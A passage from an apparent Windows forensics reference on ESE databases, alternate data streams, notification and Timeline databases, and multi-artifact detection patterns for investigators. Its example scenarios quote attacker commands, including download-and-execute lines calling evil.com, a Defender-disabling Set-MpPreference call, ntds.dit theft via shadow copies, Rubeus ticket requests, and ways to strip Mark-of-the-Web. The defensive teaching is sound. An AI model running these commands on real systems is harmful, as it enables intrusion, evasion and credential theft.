For Windows.edb, content searches over indexed documents may find fragments of files since deleted from disk.

**Gotchas:**

- **Dirty database state** — running tools against a live or improperly-acquired ESE file yields garbage or "database in inconsistent state" errors. `esentutl /mh` shows header (clean/dirty); `esentutl /r` recovers.
- **Page sizes vary** — SRUDB is 32K, ntds.dit is 8K, Windows.edb is 32K. Parsers usually auto-detect.
- **Cross-version compatibility** — newer ESE versions can't be opened by older tools.
- **WebCacheV01.dat per-user** — each profile has its own; aggregate analyses combine.
- **ntds.dit + SYSTEM hive REQUIRED for password extraction** — ntds.dit alone is encrypted blobs.
- **Windows.edb is huge** (gigabytes on document-heavy hosts); acquisition is slow.
- **`esentutl /p`** can repair but may discard data — last-resort.
- **Transaction logs must be acquired alongside the .dat**, or you get stale data.
- **Locked databases** when their service is running — copy via VSS or shutdown.
- **`esentutl /y`** copies open databases.

**Anti-forensics interactions:**

- **Deletion of WebCacheV01.dat** — `IE Cache Cleanup` deletes; service recreates empty on next session.
- **Browser-aware tools** can target the file specifically; the directory is hidden but accessible.
- **DCSync abuse** of ntds.dit — Active Directory replication trick to get hashes without touching the file on disk. Security 4662 with specific GUID is the detection.
- **Search index disable** — `Windows.edb` truncated, no future indexing.

**Cross-corroboration partners:**

- **Sysmon 11** — file creation events for ESE files.
- **VSS shadows** — historical ESE state.
- **Sysmon 9 / Security 4663** — direct raw reads of ntds.dit (extraction).
- **Security 4624** + admin account → ntds.dit access — lateral movement signal.

---

## 31. Alternate Data Streams + Zone.Identifier

**Full name:** NTFS Alternate Data Streams (ADS) — named $DATA streams on a file, in addition to the default unnamed stream that contains the file body. Zone.Identifier is a well-known ADS that Windows uses to mark files as "downloaded from the internet" for the Mark-of-the-Web (MOTW) mechanism.

**Path / location:**

ADS syntax: `filename:streamname` or `filename:streamname:$DATA`. Examples:
- `payload.exe:settings`
- `report.docx:Zone.Identifier`
- `dir:hidden.exe` (yes, directories can have streams too)

Zone.Identifier specifically: written to any file the user/shell flagged as downloaded.

**What it records:**

A generic ADS can contain arbitrary data — there is no type restriction. The size is independent of the main file. The stream is invisible to `dir`, `Get-ChildItem` (without `-Force` + parsing), most file-explorer UIs.

Zone.Identifier records:
- `[ZoneTransfer]` INI section.
- `ZoneId=` (0=Local Machine, 1=Local Intranet, 2=Trusted, 3=Internet, 4=Restricted).
- Modern versions add: `ReferrerUrl=`, `HostUrl=`, `HostIpAddress=`, `LastWriterPackageFamilyName=` (which app downloaded it).

When ZoneId=3, Windows applies MOTW: Office opens in Protected View, executables show "Unblock" prompt, SmartScreen evaluates the file.

**Format / encoding:**

Binary for ADS in general (whatever the application wrote). Zone.Identifier is plain text in INI format.

**Retention:**

ADS persist with the file as long as the file exists on NTFS. **Copying the file to a non-NTFS volume (FAT, exFAT, ZIP, network share that doesn't support streams) strips all alternate streams.** Some applications strip Zone.Identifier explicitly via "Unblock" UI.

**Parsers (by name only):**
- `streams.exe` (Sysinternals) — lists ADS.
- `dir /R` (modern cmd.exe) — lists ADS.
- `Get-Item -Stream *` (PowerShell) — enumerates ADS.
- `Get-Content -Stream Zone.Identifier` — reads.
- `MFTECmd` — captures ADS as separate rows.
- `streamhash` (Sysmon Event 15 includes hash of created stream).

**Canonical forensic insight:**

Zone.Identifier is **THE artifact for proving "this file came from the internet"** — and specifically from which URL. The `HostUrl` field has been part of Zone.Identifier since Windows 10's "Smart MOTW" — it records the download source.

For attacker tradecraft, ADS are:
1. **Storage for payload data** — e.g., `notepad.exe:evil.dll` hides DLL bytes behind a benign file.
2. **Execution via `wmic process call create`** (older Windows) or `WSH` (`cscript.exe c:\foo.txt:script.vbs`) — though many of these vectors have been hardened or removed.
3. **MOTW stripping** to evade SmartScreen — attackers package payloads in ZIPs whose contents lose Zone.Identifier on extraction (extraction tools vary).

**Gotchas:**

- **`dir` without `/R`** doesn't show streams.
- **`Get-ChildItem`** lists streams as separate items only with `-Stream`.
- **Directories can have ADS** — easy to miss.
- **Most file-tampering tools (anti-forensics) ignore ADS** — Zone.Identifier may persist on a file someone wiped.
- **Copying to FAT/exFAT strips ADS** — file moved to USB loses Zone.Identifier.
- **MOTW propagation** — files extracted from a downloaded ZIP should inherit Zone.Identifier; depends on extractor. 7-Zip historically did not propagate; Windows built-in does.
- **ADS hash via Sysmon 15** — records SHA hash of stream content; high-fidelity detection.
- **Windows Search indexes ADS content** for some text streams.
- **`echo evil > foo.txt:hidden`** is the classic ADS write — trivial.

**Anti-forensics interactions:**

- **Strip Zone.Identifier**: `Unblock-File`, manual `Remove-Item -Stream Zone.Identifier`, or `cmd: type nul > file.exe:Zone.Identifier` (zero it).
- **Strip via repackage**: copy file via FAT-volume round trip or zip-extract.
- **Hide payload in ADS**: any tool can write to `:streamname`. Persistence sometimes via Run key pointing to ADS-resident binary (older Windows; modern Defender flags).
- **Detect: hash of Zone.Identifier matches known download patterns; Sysmon 15.**

**Cross-corroboration partners:**

- **Browser history / Downloads DB** — the URL in Zone.Identifier.HostUrl should match a browser download record.
- **Sysmon 15** — alternate data stream creation.
- **$MFT** — the parent file's $DATA attribute set includes named streams.
- **Defender 1116** — if Defender flagged the ADS.

---

## 32. Notification Database (wpndatabase.db)

**Full name:** Windows Push Notification Database. SQLite database backing the Windows 10+ notification system (Toasts, Action Center).

**Path / location:**

`%LocalAppData%\Microsoft\Windows\Notifications\wpndatabase.db` (per user).

Sibling files: `wpndatabase.db-shm`, `wpndatabase.db-wal`.

**What it records:**

SQLite tables:
- `Notification` — every toast notification shown to the user: `Id`, `HandlerId`, `Type`, `Payload`, `PayloadType`, `Tag`, `Group`, `ExpiryTime`, `ArrivalTime`, `DataVersion`, `Order`.
- `NotificationHandler` — registered notification sources (apps/services). `HandlerId`, `PrimaryId` (PackageFamilyName or AUMID), `WNFEventName`, `SystemDataPropertySet`, `CreatedTime`, `ModifiedTime`.
- `NotificationData` — additional payload data.
- `WNSPushChannel` — Windows Push Notification Service channels.
- `Settings` — per-app notification settings (Toast enabled, lockscreen, etc.).
- `TransientTable` — recent transient notifications.

The `Payload` is XML or binary blob containing the toast contents — title, body, image references, action buttons.

**Format / encoding:**

SQLite. Payloads in XML (toast schema) or binary.

**Retention:**

Notifications persist in the database for some time after dismissal; not indefinitely. Action Center holds visible ones for ~3 days by default. The database persists indefinitely.

**Parsers (by name only):**
- `WpnDatabaseParser` (community Python tools).
- DB Browser for SQLite.
- log2timeline / plaso (limited).
- Yogesh Khatri's blog and tools have notes.

**Canonical forensic insight:**

The notification DB is **the artifact for "what did the user see?"** — every toast notification that popped up. For investigations of:
- Email subjects (when notifications include them).
- Chat messages (Teams, Slack, WhatsApp Desktop — if they used Windows notifications).
- File download completions.
- Security alerts (Defender notifications).
- Calendar reminders.

Notifications often include user-visible content that exists nowhere else in unencrypted form. A Teams chat preview in a toast can survive even after the Teams cache is wiped.

**Gotchas:**

- **Per-user database** — each user has their own.
- **WAL file** — must be merged for current state.
- **Payload schemas vary** by app — parsing payloads is per-app.
- **Sensitive content** — credentials, OTPs (some apps send notification OTPs), private chat content.
- **AUMID resolution** — `PrimaryId` is the AUMID; need a mapping to get human app name.
- **Recently introduced** (Windows 8.1+; richer in Windows 10).
- **Disable notifications** at OS or per-app level → no entries. Doesn't affect existing.

**Anti-forensics interactions:**

- **Clearing notifications** in Action Center removes visible ones but DB entries may remain.
- **Deleting wpndatabase.db** — Windows recreates empty; $MFT trace.
- **Disabling notifications per-app** — no future entries.

**Cross-corroboration partners:**

- **Application logs** — e.g., Outlook email subjects, Teams chat history.
- **Activities Cache** (§33) — what app was active when notification arrived.
- **Sysmon** — process that delivered the notification.

---

## 33. Activities Cache (ActivitiesCache.db)

**Full name:** Windows Timeline activity cache. SQLite database backing the Windows 10+ Timeline feature (the "Task View" history of recent activities) and the cross-device sync layer.

**Path / location:**

`%LocalAppData%\ConnectedDevicesPlatform\<L.UserName>\ActivitiesCache.db` (per user, per `L.<username>` instance — Microsoft accounts may produce multiple folder variants).

Companion: `ActivitiesCache.db-shm`, `ActivitiesCache.db-wal`.

**What it records:**

SQLite tables:
- `Activity` — each "activity": every document opened, file edited, browser tab navigated, app launched (when the app supports User Activities). Fields: `Id`, `AppId` (AUMID or path), `PackageIdHash`, `AppActivityId`, `ActivityType`, `ActivityStatus`, `ParentActivityId`, `Tag`, `Group`, `MatchId`, `LastModifiedTime`, `ExpirationTime`, `Payload` (JSON), `Priority`, `IsLocalOnly`, `PlatformDeviceId`, `CreatedInCloud`, `StartTime`, `EndTime`, `LastModifiedOnClient`, `OriginalLastModifiedOnClient`, `OriginalPayload`.
- `Activity_PackageId` — package mapping.
- `ActivityAssetCache` — payload assets.
- `ActivityOperation` — operations on activities.
- `AppSettings` — per-app activity settings.
- `Metadata` — DB metadata.
- `ManualSequence` — sync sequence.

Payload is a JSON object with:
- `displayText` — human-readable title (e.g., document name).
- `description` — file path or URL.
- `appDisplayName` — the app that produced the activity.
- `activationUri` — what URI/path opens the activity (e.g., `file:///c:/path/to/doc.docx`, `https://...`).
- `contentUri` — alternate URI.
- `backgroundImage` — embedded image bytes for thumbnail.

`ActivityType` values (3 = document/app activity, 5 = clipboard, 6 = user-engaged, 10 = task, 11/12 = focus, others).

**Format / encoding:**

SQLite. Payloads JSON. Some payloads contain embedded PNG thumbnails (base64).

**Retention:**

Default retention ~30 days. Synced activities (when the user is signed into a Microsoft Account with Timeline sync enabled) propagate to other devices.

In Windows 11 (and progressively in Win10 versions), Timeline as a user feature was removed, but the underlying ActivitiesCache.db continued to be populated by some components — check OS build before drawing absence conclusions.

**Parsers (by name only):**
- `WxTCmd` (Eric Zimmerman) — Windows Timeline parser, gold standard.
- DB Browser for SQLite.
- log2timeline / plaso `windows_timeline` parser.

**Canonical forensic insight:**

ActivitiesCache is **the cross-application MRU for Windows 10/11.** Every document opened, every browser tab, every file edited by Timeline-aware apps lands here with:
- Application name.
- Document path or URL.
- Start time, end time, last-modified time (precise to ms).
- Thumbnail image (sometimes).

This is "what the user was doing, in order, with thumbnails." For investigations into user behavior, document handling, and "did the user open this exact file at this exact time" questions, ActivitiesCache is among the highest-fidelity artifacts.

Cross-device sync: if the user is signed into a Microsoft Account, activities from OTHER devices may appear here — meaning evidence from a phone or another laptop can surface on the workstation under examination.

**Gotchas:**

- **Not all apps participate.** Apps must explicitly create User Activities. Office, browsers, and Modern UI apps do; many third-party apps do not.
- **Win11 Timeline UI was removed** — but the DB may still be populated by some components.
- **Sync from other devices** can place activities that never happened on THIS device. Check `PlatformDeviceId`.
- **Multiple `L.<user>` folders** — Microsoft Account variants. Check all.
- **Payload JSON varies** by ActivityType — parsers must handle each.
- **ExpirationTime** determines auto-cleanup; default ~30 days.
- **Encryption / Microsoft Account** — when sync is disabled, only local entries. Sync-disabled hosts have less data.
- **WAL handling** required for current state.
- **Activity start/end times** are precise — useful for correlation.

**Anti-forensics interactions:**

- **Disabling Timeline** (`Settings → Privacy → Activity history → Store my activity history on this device = off`) — stops future writes; existing entries remain.
- **Clear activity history** — wipes via UI; $MFT residue on the .db file.
- **Deleting the database** — Windows recreates empty.
- **Microsoft Account sign-out** — disables sync, local entries remain.

**Cross-corroboration partners:**

- **LNK / Jump Lists** — parallel MRU for shell-aware apps.
- **OfficeMRU registry** — Office-app-side MRU.
- **Browser History** — web visits parallel to ActivitiesCache web entries.
- **$MFT** on the files listed in activations — corroborate file existence.
- **Prefetch / Amcache** — corroborate app execution.

---

## 34. Cross-Artifact Patterns

Single-artifact findings are weak. Forensic confidence comes from **multi-artifact corroboration** — when independent records of different kinds, written by different subsystems, agree about an event. The following patterns are the canonical multi-artifact signatures that mature investigators look for. Each names what the pattern reveals, the constituent artifacts, what each artifact contributes, and the common failure modes.

These patterns are not exhaustive — they are the high-signal combinations that recur across the SANS Hunt Evil poster, the MITRE ATT&CK detection guidance, Mandiant / Crowdstrike incident reports, and the Eric Zimmerman / SANS DFIR training materials.

---

### 34.1 Pattern: "Unsigned binary ran from a user-writable path"

**What it reveals:** An executable was dropped to a location attackers favor (because it requires no admin rights — `%AppData%`, `%LocalAppData%\Temp`, `%ProgramData%`, `C:\Users\Public\`, `C:\Windows\Tasks\`, `C:\Windows\Temp\`) and executed at least once. The "unsigned" qualifier is critical — legitimate Windows binaries live in `System32`, `Program Files`, `Program Files (x86)` and are typically signed.

**Constituent artifacts:**
- **Amcache (§8)** — provides SHA1 of the binary, path, first-seen timestamp, signing status (`IsPeFile`, signing fields). Confirms the binary existed on the system with that hash.
- **ShimCache / AppCompatCache (§7)** — confirms execution (or shell-aware touch) at boot/path; provides path + last-modified.
- **Prefetch (§6)** — confirms execution from user-mode loader; provides first-run and last-eight-runs timestamps plus referenced DLLs.
- **Security 4688 / Sysmon Event 1 (§16, §17)** — process creation event with full command line, parent process, user.
- **$MFT (§1)** — file creation timestamp, parent directory, size, $DATA contents (if resident).
- **$UsnJrnl:$J (§3)** — REASON_FILE_CREATE / DATA_OVERWRITE entries showing the write pattern.

**The corroborated story:** Amcache says binary X (SHA1 abc...) at path `C:\Users\victim\AppData\Local\Temp\update.exe`, unsigned, first seen 2026-05-22 14:03:11. $MFT confirms creation at 14:03:10 by some process. $UsnJrnl shows write events. Prefetch (`UPDATE.EXE-<hash>.pf`) confirms execution at 14:03:11 (one run). Sysmon 1 shows parent process is `outlook.exe` with command line `update.exe --install`. Security 4688 confirms. ShimCache shows the path with last-modified matching $MFT.

**Why this combination matters:** Each artifact alone is ambiguous. Together they form an irreducible execution chain — file dropped, executed, with the parent context. Cannot be explained by any benign mechanism.

**Where it fails:**
- Amcache might be missing the entry on hosts where the service is disabled.
- Prefetch is off on SSD-heavy server SKUs.
- Sysmon may not be installed.
- The "user-writable path" heuristic catches more attacker activity than legitimate, but legitimate IT tools also drop to `%Temp%` — `Author` of `Microsoft` and code signing don't necessarily exclude attacker tradecraft (signed legit tools abused).

---

### 34.2 Pattern: "Log clear without service stop"

**What it reveals:** Someone deliberately cleared an event log without stopping the EventLog service. This is the canonical "operator covering tracks" signature.

**Constituent artifacts:**
- **Security 1102** — fires inside the Security log itself when it is cleared, naming the user who cleared. Cannot be suppressed by the cleaner.
- **System 104** — Microsoft-Windows-EventLog provider; fires in the System log when ANY log channel is cleared, with `Channel` field naming the cleared log. Fires even when the Security log itself is cleared (recorded by the EventLog service from outside Security).
- **System 7036** — would fire if the EventLog service stopped/started. ABSENCE of this event around the clear time is the "without service stop" qualifier.
- **$UsnJrnl:$J (§3)** — entries showing `*.evtx` truncation / shrinkage events. A clear truncates the file; the journal captures the size delta and access.
- **$LogFile (§2)** — short-window confirmation of the truncation transaction.
- **$MFT (§1)** — the `Security.evtx` file's SI Modified time updates to the clear time.

**The corroborated story:** Security 1102 at 02:14:22 by `Administrator` (well, by the SID under which the actor authenticated). System 104 at 02:14:22 with `Channel=Security`. No System 7036 stopping the EventLog service. $MFT modified time on `Security.evtx` updates to 02:14:22. $UsnJrnl shows the file truncation.

**Why this combination matters:** Cannot be explained as a service crash or maintenance. A deliberate `wevtutil cl Security` always leaves 1102 + 104.

**Where it fails:**
- If the System log itself is cleared shortly after (104 destroyed in the now-cleared System log).
- If the host is rebooted, $UsnJrnl rolls fast and the residue may be gone.
- If the attacker uses SetSecurityDescriptor to break Security log access first (rare and complex).
- 1102 fires only on Security; clearing PowerShell Operational doesn't fire a "log cleared from inside" event — only the System 104.

---

### 34.3 Pattern: "Lateral movement via stolen credentials"

**What it reveals:** An attacker authenticated to a remote host using credentials they obtained elsewhere — usually Mimikatz-style lsass dump or Kerberos ticket theft. The pattern combines authentication events on the destination with credential-access signals on the source.

**Constituent artifacts (destination — the target machine):**
- **Security 4624 LogonType=3** — network logon from the source IP, naming the user.
- **Security 4624 LogonType=10** — if the lateral movement is RDP, with source IP.
- **Security 4672** — special privileges assigned to new logon (if Administrator).
- **Security 4776** — NTLM credential validation, naming the source workstation.
- **Sysmon 3 / Firewall log** — inbound TCP connection on 445 (SMB), 3389 (RDP), 5985/5986 (WinRM), 135/RPC dynamic.
- **Sysmon 1 / Security 4688** — for RDP / PSRemoting, subsequent process creation under the logged-in account.
- **System 7045** — if the attacker used PsExec-style execution, a service is installed.
- **Scheduled Tasks XML + Security 4698** — if the attacker registered a task remotely.
- **RDP-specific (§20)** if RDP — 1149, 21/25.

**Constituent artifacts (source — the compromised host where credentials were stolen):**
- **Sysmon 10** with `TargetImage=lsass.exe`, `GrantedAccess=0x1010` or `0x1410` — Mimikatz signature handle-open against lsass.
- **Defender 1116** — if Defender detected the credential-dump tool.
- **Sysmon 1 / 4688** — process creation of the credential-dump tool.
- **PowerShell 4104** — if the dumper was Invoke-Mimikatz or similar PowerShell.
- **Pagefile / Hiberfil (§29)** — may contain dumped credential blobs.

**The corroborated story:** Source host: at 14:00, `powershell.exe` spawns (Sysmon 1), 4104 logs an `Invoke-Mimikatz` script block, Sysmon 10 fires with `GrantedAccess=0x1010` to lsass. At 14:02, destination host: Security 4624 Type 3 from source IP, account `Administrator`, LogonProcessName `NtLmSsp`. Sysmon 3 shows the SMB connection. System 7045 logs a new service called `PSEXESVC`. Sysmon 1 shows `PSEXESVC.exe` running `cmd.exe`. Security 4688 for spawned commands.

**Why this combination matters:** Each step alone could be benign (admin admin'ing, lsass debug). Chained with the matching timestamps, source/destination IPs, and the credential-dump signature, the picture is unambiguous lateral movement.

**Where it fails:**
- Kerberos-based lateral movement (Pass-the-Ticket) doesn't fire 4776 on destination; check DC for 4769 with the relevant Service Name.
- If the source uses RestrictedAdmin mode, NTLM is not cached on destination.
- Logon type 9 (NewCredentials / RunAs /netonly) on source is a strong signal for "running command as another user with their cached cred" — often a precursor to lateral movement.
- Sysmon may not be present; without it, lsass access on source is opaque.

---

### 34.4 Pattern: "Anti-forensics signature — SI/FN divergence + 1102 + UsnJrnl gap"

**What it reveals:** Active anti-forensics — timestomp + log clear + journal-residue destruction.

**Constituent artifacts:**
- **$MFT (§1)** — SI vs FN divergence. SI shows sub-second precision of zero while FN has sub-second values; or SI < FN for created; or SI shows a date earlier than the volume's creation. Any of these is a timestomp signature.
- **Security 1102** — log clear event.
- **$UsnJrnl:$J (§3)** — large gap in record numbers, sudden jump, or REASON_FILE_DELETE / REASON_FILE_OVERWRITE entries against `$UsnJrnl` itself. Some anti-forensic tools delete and recreate the journal.
- **$LogFile (§2)** — if recently truncated by the attacker, may show abnormally short content.
- **Defender 5001** — real-time protection disabled.
- **Sysmon Event 2** (FileCreateTime) — if Sysmon was active during timestomp, captures it directly.

**The corroborated story:** $MFT shows `dropper.exe` with SI created 2018-01-01 00:00:00.000 (whole seconds, plainly bogus) and FN created 2026-05-22 14:03:11.482. Sysmon Event 2 fires for the same file at 14:04:01. Security 1102 fires at 14:30 from same SID. $UsnJrnl shows the gap.

**Why this combination matters:** Each indicator individually has explanations; together, the pattern of "attacker dropped, executed, timestomped, then cleared logs" is unambiguous adversarial intent.

**Where it fails:**
- Some legitimate file-transfer operations (rsync with `--preserve-times` from remote source) can produce SI-FN divergence.
- 1102 alone is sometimes legitimate (admin cleared log for compliance reset).
- $UsnJrnl gaps occur naturally when journal is small / fast-rolling.

---

### 34.5 Pattern: "Persistence + execution + network exfil"

**What it reveals:** Full attack lifecycle on a single host — initial persistence, subsequent execution under that persistence, and outbound data flow.

**Constituent artifacts:**
- **Persistence proof:**
  - Registry Run/RunOnce, Service, Scheduled Task, WMI subscription — any of §12, §13, §14, §15.
  - System 7045 / Security 4697 / 4698 — installation event.
- **Execution proof:**
  - Amcache, Prefetch, ShimCache (§6, §7, §8).
  - Sysmon 1, Security 4688.
  - PowerShell 4104 (if PowerShell).
- **Network proof:**
  - Sysmon 3 — outbound connections by the persisted process.
  - Sysmon 22 — DNS queries by the persisted process.
  - SRUM Network Data Usage (§10) — bytes transferred.
  - Firewall log — connection records.

**The corroborated story:** Service `WindowsTelemetryService` installed 2026-05-22 (System 7045). ImagePath = `C:\ProgramData\update.exe`. Amcache confirms unsigned. Prefetch shows three runs. Sysmon 1 logs each spawn with parent `services.exe`. Sysmon 3 shows outbound TCP 443 to `evil.example.com`. Sysmon 22 logs the DNS resolution. SRUM Network Data Usage shows 4.7 GB sent on the wifi interface over 6 hours.

**Why this combination matters:** Persistence alone could be misconfigured legitimate software. Persistence + repeated execution + outbound large-byte network = exfil implant.

**Where it fails:**
- Modern exfil uses cloud APIs (Dropbox, GDrive, OneDrive) that look like normal cloud traffic.
- DNS-over-HTTPS hides Sysmon 22 visibility.
- SRUM is hourly; sub-hour exfil bursts appear as single buckets.

---

### 34.6 Pattern: "Document-borne intrusion via Office"

**What it reveals:** User opened a malicious Office document; the document spawned a child process that established persistence.

**Constituent artifacts:**
- **Browser History or Outlook OST** — origin of the document (email attachment or download URL).
- **Zone.Identifier ADS (§31)** — confirms MOTW on the document; HostUrl shows source.
- **OfficeMRU registry** — Word/Excel opened the document.
- **LNK file in Recent (§24)** — automatic recent for the document.
- **Sysmon 1 / Security 4688** — `winword.exe` / `excel.exe` parent spawned `cmd.exe` / `powershell.exe` / `mshta.exe` / `rundll32.exe` — the classic "Office child process" signature.
- **PowerShell 4104** — if PowerShell child, script block content.
- **Sysmon 22** — DNS / Sysmon 3 — outbound from child.
- **Amcache + Prefetch** — confirm execution of dropped payload.
- **Persistence indicators** (§12-15).

**The corroborated story:** Outlook received `invoice.docx`. Word opens it (OfficeMRU, LNK). Zone.Identifier shows HostUrl=outlook.com. Sysmon 1: `winword.exe` (PID 4824) spawns `powershell.exe` with encoded command. PowerShell 4104 logs the decoded command (`IEX (New-Object Net.WebClient).DownloadString('http://evil/loader.ps1')`). Sysmon 22 logs DNS for evil.com. Sysmon 3 shows TCP 80. Subsequent Sysmon 1 logs `powershell.exe` spawning the loader. Run key added (Sysmon 13). Amcache + Prefetch confirm execution of loaded payload.

**Why this combination matters:** Office spawning command shells is the highest-signal macro-malware indicator. Combined with the document provenance trail, the case is airtight.

**Where it fails:**
- Some legitimate workflows DO spawn shells from Office (build tools, ETL scripts).
- ASR rule "Block all Office applications from creating child processes" prevents this entirely if enabled.
- VBA-disabled Office instances are immune.

---

### 34.7 Pattern: "USB-based data theft"

**What it reveals:** A user copied files from internal storage to an external USB drive.

**Constituent artifacts:**
- **USBSTOR / MountedDevices / setupapi.dev.log (§28)** — USB device identification and attach timestamp.
- **NTUSER MountPoints2** — the specific user attached the device.
- **ShellBags (§23)** — folders browsed on the USB volume.
- **LNK files (§24)** — files OPENED from the USB volume (with volume serial proving USB origin); LNK files in Recent for source files BEFORE copy.
- **Jump Lists (§24)** — per-app MRU for files accessed via the USB.
- **$MFT on the USB volume** (if available) — file creations on USB matching internal source files (same name, same size, similar MAC times).
- **SRUM Application Resource Usage (§10)** — if a copy tool was used, CPU/disk metrics.
- **Sysmon 11** — file create events on USB volume.

**The corroborated story:** USBSTOR shows `Kingston DT 4 GB` first attached 2026-05-22 17:43 with serial 1234. NTUSER MountPoints2 for SID-...-1001 last-write = 17:43. ShellBags show user browsed `E:\` and `E:\confidential\`. LNK in Recent shows `secret.docx` opened from `C:\corporate\secret.docx` at 17:40. Sysmon 11 shows file creation at `E:\secret.docx` at 17:45. $MFT on the USB confirms.

**Why this combination matters:** Every benign explanation requires denying multiple independent artifacts. USB plus folder browsing plus file LNK plus Sysmon copy plus SRUM throughput collectively defeat plausible deniability.

**Where it fails:**
- If the USB is encrypted (VeraCrypt container), the file-level artifacts on USB volume aren't readable.
- If the user uses cloud sync (Dropbox watching a USB folder) — exfil happens via cloud, not USB.
- If the USB volume is later reformatted, $MFT on it is destroyed; the host-side artifacts remain.

---

### 34.8 Pattern: "Kerberos ticket abuse (Pass-the-Ticket / Golden Ticket)"

**What it reveals:** An attacker forged or stole a Kerberos ticket and is using it to authenticate without going through legitimate TGT issuance.

**Constituent artifacts:**
- **Domain Controller Security 4769** — TGS request. Forged tickets often show: encryption type weak (RC4 / 0x17 instead of AES), unusual ticket options, mismatched account/SID combinations.
- **Destination host Security 4624 Type 3** — logon with no preceding 4768 (TGT) for that account on the DC — because the attacker used a forged TGT.
- **Sysmon 10** on source host — process accessing LSASS to extract tickets (if Pass-the-Ticket).
- **PowerShell 4104** — if Invoke-Mimikatz, Rubeus, or similar PowerShell tool.
- **Sysmon 1** — `mimikatz.exe`, `rubeus.exe`, or detection of process behavior.
- **DC Security 4672** — special privileges assigned (admin-equivalent) where the TGT was forged.
- **Golden Ticket-specific:** account `krbtgt` password hash version mismatched; tickets valid for 10 years; account in TGS-REQ doesn't exist in AD.

**The corroborated story:** Source host at 03:00: PowerShell 4104 captures `Rubeus.exe asktgt /user:bob /rc4:<hash>`. Sysmon 10 on lsass. On DC: 4769 for service spn=cifs/finance.corp.local with encryption type 0x17. Destination host: 4624 Type 3 by `bob`, but `bob` last logged in days ago — no 4768 today on DC. Sysmon 3 inbound SMB.

**Why this combination matters:** Kerberos signals are subtle individually; combined with the source-host credential-access signature and destination logon, the pattern resolves.

**Where it fails:**
- Without DC-side logs, half the picture is invisible.
- Encryption type RC4 may be legitimate for older clients.
- Detection often relies on krbtgt rotation cadence and known account inventory.

---

### 34.9 Pattern: "Living-off-the-land binary (LOLBin) abuse"

**What it reveals:** Attacker used a legitimate Windows binary (signed, on every system) to perform malicious work — `mshta.exe`, `regsvr32.exe`, `rundll32.exe`, `certutil.exe`, `bitsadmin.exe`, `wmic.exe`, `msbuild.exe`, etc.

**Constituent artifacts:**
- **Sysmon 1 / Security 4688** — process creation of the LOLBin with attacker-controlled command line. The command line is the key — `certutil -urlcache -split -f http://evil/payload.exe` is unambiguous.
- **PowerShell 4104** — if invoked from PowerShell.
- **Sysmon 22** — DNS query from the LOLBin to attacker domain.
- **Sysmon 3** — outbound connection.
- **Sysmon 11** — file creation by the LOLBin (e.g., `payload.exe` written to disk).
- **Amcache + Prefetch** — confirm execution of the dropped payload (downstream).
- **PCA / RecentApps** — auxiliary execution records.

**The corroborated story:** Security 4688 at 14:00: `certutil.exe -urlcache -split -f http://evil.com/p.exe %TEMP%\p.exe`. Sysmon 22 logs DNS for evil.com. Sysmon 3 logs TCP 80 to attacker IP. Sysmon 11 logs `%TEMP%\p.exe` created. Subsequent Sysmon 1: `p.exe` spawned by `cmd.exe`. Amcache + Prefetch confirm.

**Why this combination matters:** A LOLBin alone is benign; a LOLBin with a "download and execute" command line is the smoking gun. Combined with the downstream payload execution, the chain is closed.

**Where it fails:**
- ASR rules block many LOLBin patterns; if enabled, the patterns may not produce execution evidence.
- Process command-line auditing must be enabled for Security 4688 to capture command lines.
- Sysmon must be present for the richer signals.

---

### 34.10 Pattern: "Defender disabled before payload execution"

**What it reveals:** Attacker disabled real-time protection or added an exclusion immediately before dropping their payload — a defensive evasion pattern.

**Constituent artifacts:**
- **Defender 5001** — real-time protection disabled.
- **Defender 5007** — configuration changed (exclusion added).
- **Defender 5012 / 5013** — scanning / behavior monitoring disabled.
- **Registry 4657 / Sysmon 13** — registry value writes to `HKLM\SOFTWARE\Microsoft\Windows Defender\` keys (DisableRealtimeMonitoring, ExclusionPath, etc.).
- **Sysmon 1 / Security 4688** — process that issued the Defender change (often `powershell.exe Set-MpPreference`).
- **PowerShell 4104** — script block content of the Set-MpPreference invocation.
- **Subsequent execution artifacts** — Amcache / Prefetch / Sysmon 1 for the payload that ran shortly after.

**The corroborated story:** 02:01: Sysmon 1 logs PowerShell with command `Set-MpPreference -DisableRealtimeMonitoring $true -ExclusionPath C:\ProgramData`. PowerShell 4104 captures. Defender 5001 fires. Defender 5007 fires. 02:02: Sysmon 11 writes `C:\ProgramData\implant.exe`. 02:02: Sysmon 1 spawns `implant.exe` — no Defender detection because RTP is off and path is excluded. Amcache + Prefetch confirm.

**Why this combination matters:** Defender being off is rarely benign on a managed endpoint. Combined with the immediate-payload timing, the intent is clear.

**Where it fails:**
- Tamper Protection (modern Win10/11) prevents most user-mode Defender disable attempts.
- Some Defender configuration changes happen during Windows Update — baseline knowledge required.

---

### 34.11 Pattern: "Volume Shadow Copy abuse for ntds.dit / SAM exfil"

**What it reveals:** Attacker used VSS to read otherwise-locked SYSTEM files (ntds.dit on DC, or SAM/SYSTEM on workstation) by creating a shadow and copying out the snapshot.

**Constituent artifacts:**
- **System log volsnap events** — shadow creation.
- **Sysmon 1 / Security 4688** — `vssadmin.exe create shadow` or `wmic shadowcopy call create` invocations.
- **PowerShell 4104** — if PowerShell + WMI / Get-WmiObject called.
- **Security 4624** — privileged logon (admin needed for VSS).
- **Sysmon 11 / $MFT** — file creation of target output (`ntds.dit.copy`, `SYSTEM.copy`).
- **Sysmon 3 / firewall** — outbound exfil of the copies.
- **VSS itself** — the created shadow may persist; analysis of `vssadmin list shadows` output and the shadow timestamps confirms.

**The corroborated story:** 03:14: 4688 logs `vssadmin create shadow /for=C:`. 03:14: System log volsnap event. 03:15: 4688 logs `cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\nd.dit`. Sysmon 11 captures the file create. 03:16: file size of `nd.dit` ~ 200 MB. 03:18: Sysmon 3 logs outbound TCP 443 to attacker C2 of comparable byte count.

**Why this combination matters:** VSS is admin-privilege territory; manual shadow creation followed by extraction of secret-laden files is a high-confidence indicator of credential theft preparation.

**Where it fails:**
- DCSync uses MS-DRSR replication to fetch hashes without touching the file — a different signal (Security 4662 with specific GUIDs).
- Legitimate backup software creates shadows constantly.

---

### 34.12 Pattern: "Scheduled task that doesn't show in Task Scheduler"

**What it reveals:** Attacker created a task but tampered with the registry / SDDL to hide it from the GUI — or created it via direct XML drop without registering via schtasks.

**Constituent artifacts:**
- **`C:\Windows\System32\Tasks\` directory** — XML file present on disk.
- **HKLM TaskCache registry** — index entries (Hash, Path) for the task.
- **Mismatch:** XML present but registry index missing (task won't run), or vice versa (orphaned registry entries).
